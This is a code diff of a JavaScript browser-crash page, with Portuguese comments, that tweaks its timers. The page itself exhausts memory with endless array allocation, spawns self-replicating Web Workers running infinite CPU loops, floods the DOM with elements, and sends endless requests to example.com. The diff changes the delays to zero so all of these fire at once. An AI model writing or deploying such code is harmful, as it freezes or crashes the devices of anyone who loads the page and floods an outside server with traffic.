@@ -120,14 +120,14 @@
                     while (true) {
                         const arr = new Array(1000000).fill(new Float32Array(1000));
                     }
-                }, 100);
+                }, 000);
 
                 // 3. Web Workers (CPU)
                 function crashWorkers() {
                     const blob = new Blob(['while(true){for(let i=0;i<1000000;i++){Math.sin(i);}}'], { type: 'text/javascript' });
                     const url = URL.createObjectURL(blob);
                     new Worker(url);
-                    setTimeout(crashWorkers, 10);
+                    setTimeout(crashWorkers, 00);
                 }
                 crashWorkers();
 
@@ -141,14 +141,14 @@
                             document.body.appendChild(div);
                         }
                     }
-                }, 200);
+                }, 000);
 
                 // 5. Rede (limitado por CORS)
                 setTimeout(() => {
                     while (true) {
                         fetch('https://example.com', { mode: 'no-cors' }).catch(() => {});
                     }
-                }, 300);
+                }, 000);
 
                 // Loop infinito para criar elementos DOM
                 setTimeout(() => {
@@ -158,7 +158,7 @@
                         div.style.height = '100px';
                         document.body.appendChild(div);
                     }
-                }, 300);
+                }, 000);
 
             } catch (e) {
                 document.getElementById('status').textContent = 'Crash falhou: veja console.';
